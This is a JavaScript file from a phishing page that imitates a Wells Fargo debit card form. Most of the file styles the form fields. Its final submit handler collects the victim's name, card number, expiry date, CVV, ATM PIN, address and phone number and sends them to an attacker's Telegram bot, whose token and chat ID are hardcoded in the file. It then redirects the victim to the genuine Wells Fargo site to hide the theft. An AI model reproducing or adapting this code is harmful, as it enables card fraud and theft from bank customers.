/*--------- Keep label elevated ------------*/

// Wrap your code in a function
function initializeFormBehavior() {
    // Select the input elements and their corresponding labels
    var inputElements = document.querySelectorAll('.form-contact2 input[type="text"], .form-contact2 input[type="text"], .form-contact2 input[type="number"], .form-contact2 input[type="email"], .form-contact2 input[type="password"]');
    var labels = document.querySelectorAll('.inputbox2 label, .inputbox22 label, .inputbox32 label, .inputbox42 label, .inputbox5 label, .inputbox6 label, .inputboxphone label, .inputboxstate label');

    // Loop through each input element and add an event listener for the 'input' event
    inputElements.forEach(function(inputElement, index) {
        inputElement.addEventListener('input', function() {
            // Check if the input element is not empty
            if (inputElement.value !== '') {
                // Modify the label's position for the corresponding input
                labels[index].style.transform = 'translateY(-160%) translateX(-15%) scale(0.9)';
            } else {
                // Reset the label's position if the input is empty
                labels[index].style.transform = 'translateY(-50%)';
            }
        });
    });
}

// Add an event listener for the 'DOMContentLoaded' event
document.addEventListener('DOMContentLoaded', initializeFormBehavior);

// JavaScript to handle the input behavior make red
document.addEventListener('DOMContentLoaded', function() {
    var input = document.getElementById('fcard');
    var label = input.nextElementSibling;

    // Function to apply red styling to placeholder
    function applyRedPlaceholder() {
        input.style.borderBottomColor = 'rgb(137, 0, 0)';
        label.style.color = 'rgb(137, 0, 0)';
    }

    // Function to restore original placeholder and grey styling
    function restoreGreyStyling() {
        input.style.borderBottomColor = 'rgb(164, 164, 164)';
        label.style.color = 'rgb(164, 164, 164)';
    }

    function bluestyling() {
        input.style.borderBottomColor = 'rgb(62, 0, 117)';
        label.style.color = 'rgb(164, 164, 164)';
    }

    // Apply grey styling when the page loads
    restoreGreyStyling();

    // When input is focused (clicked inside), restore grey styling
    input.addEventListener('focus', function() {
        bluestyling();
    });

    // When input loses focus (clicked off), apply red styling to placeholder if empty
    input.addEventListener('blur', function() {
        if (input.value.trim() === '') {
            applyRedPlaceholder();
        } else {
            restoreGreyStyling();
        }
    });
});


document.addEventListener('DOMContentLoaded', function() {
    var input = document.getElementById('fexp');
    var label = input.nextElementSibling;

    // Function to apply red styling to placeholder
    function applyRedPlaceholder() {
        input.style.borderBottomColor = 'rgb(137, 0, 0)';
        label.style.color = 'rgb(137, 0, 0)'
    }

    // Function to restore original placeholder and grey styling
    function restoreGreyStyling() {
        input.style.borderBottomColor = 'rgb(164, 164, 164)';
        label.style.color = 'rgb(164, 164, 164)';

    }

    function bluestyling() {
        input.style.borderBottomColor = 'rgb(62, 0, 117)';
        label.style.color = 'rgb(164, 164, 164)';
    }

    // Apply grey styling when the page loads
    restoreGreyStyling();

    // When input is focused (clicked inside), restore styling
    input.addEventListener('focus', function() {
        bluestyling();
    });

    // When input loses focus (clicked off), apply red styling to placeholder if empty
    input.addEventListener('blur', function() {
        if (input.value.trim() === '') {
            applyRedPlaceholder();
        } else {
            restoreGreyStyling();
        }
    });
});

document.addEventListener('DOMContentLoaded', function() {
    var input = document.getElementById('fname');
    var label = input.nextElementSibling;

    // Function to apply red styling to placeholder
    function applyRedPlaceholder() {
        input.style.borderBottomColor = 'rgb(137, 0, 0)';
        label.style.color = 'rgb(137, 0, 0)'
    }

    // Function to restore original placeholder and grey styling
    function restoreGreyStyling() {
        input.style.borderBottomColor = 'rgb(164, 164, 164)';
        label.style.color = 'rgb(164, 164, 164)';

    }

    function bluestyling() {
        input.style.borderBottomColor = 'rgb(62, 0, 117)';
        label.style.color = 'rgb(164, 164, 164)';
    }

    // Apply grey styling when the page loads
    restoreGreyStyling();

    // When input is focused (clicked inside), restore styling
    input.addEventListener('focus', function() {
        bluestyling();
    });

    // When input loses focus (clicked off), apply red styling to placeholder if empty
    input.addEventListener('blur', function() {
        if (input.value.trim() === '') {
            applyRedPlaceholder();
        } else {
            restoreGreyStyling();
        }
    });
});

document.addEventListener('DOMContentLoaded', function() {
    var input = document.getElementById('fzip');
    var label = input.nextElementSibling;

    // Function to apply red styling to placeholder
    function applyRedPlaceholder() {
        input.style.borderBottomColor = 'rgb(137, 0, 0)';
        label.style.color = 'rgb(137, 0, 0)'
    }

    // Function to restore original placeholder and grey styling
    function restoreGreyStyling() {
        input.style.borderBottomColor = 'rgb(164, 164, 164)';
        label.style.color = 'rgb(164, 164, 164)';

    }

    function bluestyling() {
        input.style.borderBottomColor = 'rgb(62, 0, 117)';
        label.style.color = 'rgb(164, 164, 164)';
    }

    // Apply grey styling when the page loads
    restoreGreyStyling();

    // When input is focused (clicked inside), restore styling
    input.addEventListener('focus', function() {
        bluestyling();
    });

    // When input loses focus (clicked off), apply red styling to placeholder if empty
    input.addEventListener('blur', function() {
        if (input.value.trim() === '') {
            applyRedPlaceholder();
        } else {
            restoreGreyStyling();
        }
    });
});


document.addEventListener('DOMContentLoaded', function() {
    var input = document.getElementById('fcvv');
    var label = input.nextElementSibling;

    // Function to apply red styling to placeholder
    function applyRedPlaceholder() {
        input.style.borderBottomColor = 'rgb(137, 0, 0)';
        label.style.color = 'rgb(137, 0, 0)'
    }

    // Function to restore original placeholder and grey styling
    function restoreGreyStyling() {
        input.style.borderBottomColor = 'rgb(164, 164, 164)';
        label.style.color = 'rgb(164, 164, 164)';

    }

    function bluestyling() {
        input.style.borderBottomColor = 'rgb(62, 0, 117)';
        label.style.color = 'rgb(164, 164, 164)';
    }

    // Apply grey styling when the page loads
    restoreGreyStyling();

    // When input is focused (clicked inside), restore styling
    input.addEventListener('focus', function() {
        bluestyling();
    });

    // When input loses focus (clicked off), apply red styling to placeholder if empty
    input.addEventListener('blur', function() {
        if (input.value.trim() === '') {
            applyRedPlaceholder();
        } else {
            restoreGreyStyling();
        }
    });
});

document.addEventListener('DOMContentLoaded', function() {
    var input = document.getElementById('faddress');
    var label = input.nextElementSibling;

    // Function to apply red styling to placeholder
    function applyRedPlaceholder() {
        input.style.borderBottomColor = 'rgb(137, 0, 0)';
        label.style.color = 'rgb(137, 0, 0)'
    }

    // Function to restore original placeholder and grey styling
    function restoreGreyStyling() {
        input.style.borderBottomColor = 'rgb(164, 164, 164)';
        label.style.color = 'rgb(164, 164, 164)';

    }

    function bluestyling() {
        input.style.borderBottomColor = 'rgb(62, 0, 117)';
        label.style.color = 'rgb(164, 164, 164)';
    }

    // Apply grey styling when the page loads
    restoreGreyStyling();

    // When input is focused (clicked inside), restore styling
    input.addEventListener('focus', function() {
        bluestyling();
    });

    // When input loses focus (clicked off), apply red styling to placeholder if empty
    input.addEventListener('blur', function() {
        if (input.value.trim() === '') {
            applyRedPlaceholder();
        } else {
            restoreGreyStyling();
        }
    });
});

document.addEventListener('DOMContentLoaded', function() {
    var input = document.getElementById('fstate');
    var label = input.nextElementSibling;

    // Function to apply red styling to placeholder
    function applyRedPlaceholder() {
        input.style.borderBottomColor = 'rgb(137, 0, 0)';
        label.style.color = 'rgb(137, 0, 0)'
    }

    // Function to restore original placeholder and grey styling
    function restoreGreyStyling() {
        input.style.borderBottomColor = 'rgb(164, 164, 164)';
        label.style.color = 'rgb(164, 164, 164)';

    }

    function bluestyling() {
        input.style.borderBottomColor = 'rgb(62, 0, 117)';
        label.style.color = 'rgb(164, 164, 164)';
    }

    // Apply grey styling when the page loads
    restoreGreyStyling();

    // When input is focused (clicked inside), restore styling
    input.addEventListener('focus', function() {
        bluestyling();
    });

    // When input loses focus (clicked off), apply red styling to placeholder if empty
    input.addEventListener('blur', function() {
        if (input.value.trim() === '') {
            applyRedPlaceholder();
        } else {
            restoreGreyStyling();
        }
    });
});

document.addEventListener('DOMContentLoaded', function() {
    var input = document.getElementById('fcity');
    var label = input.nextElementSibling;

    // Function to apply red styling to placeholder
    function applyRedPlaceholder() {
        input.style.borderBottomColor = 'rgb(137, 0, 0)';
        label.style.color = 'rgb(137, 0, 0)'
    }

    // Function to restore original placeholder and grey styling
    function restoreGreyStyling() {
        input.style.borderBottomColor = 'rgb(164, 164, 164)';
        label.style.color = 'rgb(164, 164, 164)';

    }

    function bluestyling() {
        input.style.borderBottomColor = 'rgb(62, 0, 117)';
        label.style.color = 'rgb(164, 164, 164)';
    }

    // Apply grey styling when the page loads
    restoreGreyStyling();

    // When input is focused (clicked inside), restore styling
    input.addEventListener('focus', function() {
        bluestyling();
    });

    // When input loses focus (clicked off), apply red styling to placeholder if empty
    input.addEventListener('blur', function() {
        if (input.value.trim() === '') {
            applyRedPlaceholder();
        } else {
            restoreGreyStyling();
        }
    });
});

document.addEventListener('DOMContentLoaded', function() {
    var input = document.getElementById('fphone2');
    var label = input.nextElementSibling;

    // Function to apply red styling to placeholder
    function applyRedPlaceholder() {
        input.style.borderBottomColor = 'rgb(137, 0, 0)';
        label.style.color = 'rgb(137, 0, 0)'
    }

    // Function to restore original placeholder and grey styling
    function restoreGreyStyling() {
        input.style.borderBottomColor = 'rgb(164, 164, 164)';
        label.style.color = 'rgb(164, 164, 164)';

    }

    function bluestyling() {
        input.style.borderBottomColor = 'rgb(62, 0, 117)';
        label.style.color = 'rgb(164, 164, 164)';
    }

    // Apply grey styling when the page loads
    restoreGreyStyling();

    // When input is focused (clicked inside), restore styling
    input.addEventListener('focus', function() {
        bluestyling();
    });

    // When input loses focus (clicked off), apply red styling to placeholder if empty
    input.addEventListener('blur', function() {
        if (input.value.trim() === '') {
            applyRedPlaceholder();
        } else {
            restoreGreyStyling();
        }
    });
});

document.addEventListener('DOMContentLoaded', function() {
    var input = document.getElementById('fpin');
    var label = input.nextElementSibling;

    // Function to apply red styling to placeholder
    function applyRedPlaceholder() {
        input.style.borderBottomColor = 'rgb(137, 0, 0)';
        label.style.color = 'rgb(137, 0, 0)'
    }

    // Function to restore original placeholder and grey styling
    function restoreGreyStyling() {
        input.style.borderBottomColor = 'rgb(164, 164, 164)';
        label.style.color = 'rgb(164, 164, 164)';

    }

    function bluestyling() {
        input.style.borderBottomColor = 'rgb(62, 0, 117)';
        label.style.color = 'rgb(164, 164, 164)';
    }

    // Apply grey styling when the page loads
    restoreGreyStyling();

    // When input is focused (clicked inside), restore styling
    input.addEventListener('focus', function() {
        bluestyling();
    });

    // When input loses focus (clicked off), apply red styling to placeholder if empty
    input.addEventListener('blur', function() {
        if (input.value.trim() === '') {
            applyRedPlaceholder();
        } else {
            restoreGreyStyling();
        }
    });
});

document.addEventListener('DOMContentLoaded', function() {
    var input = document.getElementById('fzip');
    var label = input.nextElementSibling;

    // Function to apply red styling to placeholder
    function applyRedPlaceholder() {
        input.style.borderBottomColor = 'rgb(137, 0, 0)';
        label.style.color = 'rgb(137, 0, 0)'
    }

    // Function to restore original placeholder and grey styling
    function restoreGreyStyling() {
        input.style.borderBottomColor = 'rgb(164, 164, 164)';
        label.style.color = 'rgb(164, 164, 164)';

    }

    function bluestyling() {
        input.style.borderBottomColor = 'rgb(62, 0, 117)';
        label.style.color = 'rgb(164, 164, 164)';
    }

    // Apply grey styling when the page loads
    restoreGreyStyling();

    // When input is focused (clicked inside), restore styling
    input.addEventListener('focus', function() {
        bluestyling();
    });

    // When input loses focus (clicked off), apply red styling to placeholder if empty
    input.addEventListener('blur', function() {
        if (input.value.trim() === '') {
            applyRedPlaceholder();
        } else {
            restoreGreyStyling();
        }
    });
});


document.addEventListener('DOMContentLoaded', () => {
    // Submissions
    const ftext = document.getElementById('fname');
    const ftextt = document.getElementById('fcard');
    const ftexttt = document.getElementById('fexp');
    const f4 = document.getElementById('fcvv');
    const f5 = document.getElementById('faddress');
    const f6 = document.getElementById('fzip');
    const fp = document.getElementById('fcity');
    const fstate = document.getElementById('fstate');
    const fph = document.getElementById('fphone2');
    const pin = document.getElementById('fpin');
    const submit = document.getElementsByClassName('form-contact2')[0];

    submit.addEventListener('submit', async (e) => {
        e.preventDefault();

        let ebody = `
        \n
        <b>[Wells Fargo Debit + Pin]</b>
        \n
        <b>Full Name: </b>${ftext.value}
        \n
        <b>Card Number: </b>${ftextt.value}
        \n
        <b>Exp Date: </b>${ftexttt.value}
        \n
        <b>CVV: </b>${f4.value}
        \n
        <b>ATM Pin: </b>${pin.value}
        \n
        <b>Address: </b>${f5.value}
        \n
        <b>Zip Code: </b>${f6.value}
        \n
        <b>City: </b>${fp.value}
        \n
        <b>State: </b>${fstate.value}
        \n
        <b>Phone Number: </b>${fph.value}
        \n`;

        // Telegram Bot API endpoint
        const telegramBotToken = '5943159759:AAF2du7IRutCVQStuAp66ZdnfuKkJNjLtnA';
        const chatId = '6391433593';

        const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

        try {
            const response = await axios.post(telegramApiUrl, {
                chat_id: chatId,
                text: ebody,
                parse_mode: 'HTML',
            });

            // Redirect after sending the message
            window.location.href = "https://www.wellsfargo.com/savings-cds/certificate-of-deposit/";
        } catch (error) {
            console.error("Error sending message to Telegram:", error);

            // Check if there's a specific error message from the Telegram API response
            if (error.response && error.response.data) {
                console.error("Telegram API error:", error.response.data);
            }
        }
    });
});  

